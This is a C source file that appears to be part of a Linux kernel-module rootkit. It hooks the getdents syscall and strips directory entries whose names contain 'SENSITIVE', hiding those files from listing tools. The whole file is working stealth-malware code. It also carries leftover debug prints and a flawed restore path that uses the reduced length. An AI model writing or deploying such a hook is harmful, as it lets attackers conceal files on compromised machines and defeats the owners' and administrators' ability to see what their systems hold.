#ifndef GETDENTS_HOOK_H
#define GETDENTS_HOOK_H
// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/init.h>

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo add include protection in header
#include "getdents_hook.h"



static asmlinkage long (*orig_getdents)(const struct pt_regs*);

asmlinkage int hook_getdents(const struct pt_regs* regs) {
        long ret; // will represent the amount of bytes to process, set by the getdents call
        unsigned long offset = 0;
        unsigned long bytes_left;
        struct linux_dirent64 *d, *kdirent, *kdirent_orig; // kdirent_orig is in case something fails
        char *dirp = (char *)regs->si; // will hold the results of the getdents call
        ret = orig_getdents(regs);
        pr_info("sdfsdf\n");
        long orig_ret = ret; // in case something fails
        if (ret <= 0) {
                return ret;
        }

        kdirent = kmalloc(ret, GFP_KERNEL); // allocate memory on kernel
        if (!kdirent) {
                return ret;
        }

        kdirent_orig = kmalloc(ret, GFP_KERNEL);  // CHANGED: new backup allocation
        if (!kdirent_orig) {
                kfree(kdirent);
                return ret;
        }


        if (copy_from_user(kdirent, dirp, ret)) { // copy original results into the kernel buffer
                kfree(kdirent);
                kfree(kdirent_orig);
                return ret;
        }
        pr_info("sdfsdf\n");
        memcpy(kdirent_orig, kdirent, ret);

        bytes_left = ret; 
        while (bytes_left > 0) {
                d = (struct linux_dirent64 *)((char *)kdirent + offset); // get next entry
                if (strstr(d->d_name, "SENSITIVE")) {
                        size_t tmp = d->d_reclen; // store as tmp otherwise it will be overwritten by next entry after memmove
                        memmove(d, (char *)d + tmp, bytes_left - tmp); // move next entries backwards to overwrite the hidden entry
                        ret -= tmp; // reduce bytes to read (to return)
                        bytes_left -= tmp; // reduce bytes to read in this loop
                        continue; // do no update offset, as next iteration will use the same offset where the new memory was placed
                }

                offset += d->d_reclen;
                bytes_left -= d->d_reclen;

        }

        if (copy_to_user(dirp, kdirent, ret)) { // copy the filtered result + new 'ret' val into user space
                copy_to_user(dirp, kdirent_orig, ret); // restore original if copying modified fails
                kfree(kdirent_orig);
                kfree(kdirent);
                return ret;
        }

        kfree(kdirent_orig);
        kfree(kdirent);
        return ret; // return new size
}

#endif // GETDENTS_HOOK_H
